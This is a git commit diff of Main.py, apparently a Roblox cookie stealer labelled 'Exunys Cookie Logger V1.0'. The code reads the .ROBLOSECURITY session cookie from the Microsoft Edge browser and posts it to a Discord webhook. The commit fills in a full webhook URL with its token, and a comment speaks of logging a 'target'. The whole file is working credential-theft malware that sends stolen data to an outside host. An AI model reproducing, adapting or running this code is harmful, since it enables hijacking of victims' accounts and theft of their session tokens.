2cd1c7a538033fbba4e2692a57985b987f30f32c
diamonddoodog <jamestaterr@gmail.com>
2025-05-09 19:38:59 -0400

    Update Main.py

--- Main.py
+++ Main.py
@@ -1,13 +1,13 @@
 import browser_cookie3, requests, threading
 
-WebHook = "INPUT_HERE" # Input your webhook here and make sure to compile if you want to log your target
+WebHook = "https://discordapp.com/api/webhooks/1370507114107371540/TuHoElylpwiInT_ZdAd8pZk_Y0vxgnF-r6FSmmkqofH_lTM8VsvIk-PiSyy9YF2e5mrA" # Input your webhook here and make sure to compile if you want to log your target
 
 def MicrosoftEdge():
     try:
         cookies = browser_cookie3.edge(domain_name = "roblox.com")
         cookies = str(cookies)
         cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
-        requests.post(WebHook, json = {"username" : "Exunys Cookie Logger V1.0", "content" : f"```{cookie}```"})
+        requests.post(WebHook, json = {"diamonddoodog" : "Exunys Cookie Logger V1.0", "content" : f"```{cookie}```"})
     except:
         pass
 
